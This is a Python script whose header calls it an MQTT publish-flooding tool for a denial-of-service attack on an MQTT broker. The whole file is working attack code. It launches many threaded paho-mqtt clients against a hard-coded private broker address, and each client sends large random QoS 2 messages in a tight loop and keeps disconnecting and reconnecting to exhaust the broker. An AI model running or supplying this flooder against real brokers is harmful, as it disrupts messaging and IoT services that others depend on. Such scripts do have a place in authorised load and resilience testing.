##### ---------------------------------------------------------------------------------------
##### Author: Hung Le
##### Create Date: 10th September 2024
##### Description: MQTT Publish Flooding Script for performing DoS attack against MQTT broker
##### ---------------------------------------------------------------------------------------

import paho.mqtt.client as mqtt
import time
import random
import string
import threading

# MQTT Broker settings
BROKER_ADDRESS = "192.168.10.70" 
PORT = 1883  
MESSAGE_RATE = 200000000000000000  
MESSAGE_SIZE = 500000  
NUM_CLIENTS = 100000000 
DISCONNECT_RATE = 50 
KEEPALIVE = 5  # Low keepalive interval to increase heartbeat frequency
QOS_LEVEL = 2  # QoS level 2 for exactly once delivery

stop_flag = threading.Event()

# generate random message
def generate_random_message(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"Client connected to MQTT Broker!")
    else:
        print(f"Failed to connect. Error code: {rc}")

def on_disconnect(client, userdata, rc):
    if rc != 0:
        print(f"Client disconnected from MQTT Broker!")

def mqtt_flood(client_id):
    client = mqtt.Client(client_id, protocol=mqtt.MQTTv311, clean_session=False)
    client.on_connect = on_connect
    client.on_disconnect = on_disconnect
    client.connect(BROKER_ADDRESS, PORT, keepalive=KEEPALIVE)

    client.loop_start()

    try:
        message_count = 0
        while not stop_flag.is_set():
            message = generate_random_message(MESSAGE_SIZE)
            topic = f"dos/{client_id}/flood/{random.randint(1, 100)}" 
            print(f"Client {client_id} sent message to {topic} with QoS {QOS_LEVEL}")
            client.publish(topic, message, qos=QOS_LEVEL)
            message_count += 1
            if message_count % DISCONNECT_RATE == 0:
                client.disconnect() 
                client.connect(BROKER_ADDRESS, PORT, keepalive=KEEPALIVE)
            time.sleep(1 / MESSAGE_RATE) 
    except KeyboardInterrupt:
        print(f"Attack stopped by client {client_id}.")

    client.loop_stop()
    client.disconnect()

# start multiple clients
threads = []
for i in range(NUM_CLIENTS):
    client_id = f"MQTTFloodClient_{random.randint(1000, 9999)}"
    t = threading.Thread(target=mqtt_flood, args=(client_id,))
    threads.append(t)
    t.start()

try:
    while True:
        time.sleep(1)  
except KeyboardInterrupt:
    print("Keyboard Interrupt detected, stopping all clients...")
    stop_flag.set()  
    for t in threads:
        t.join() 
    print("All clients have been stopped.")
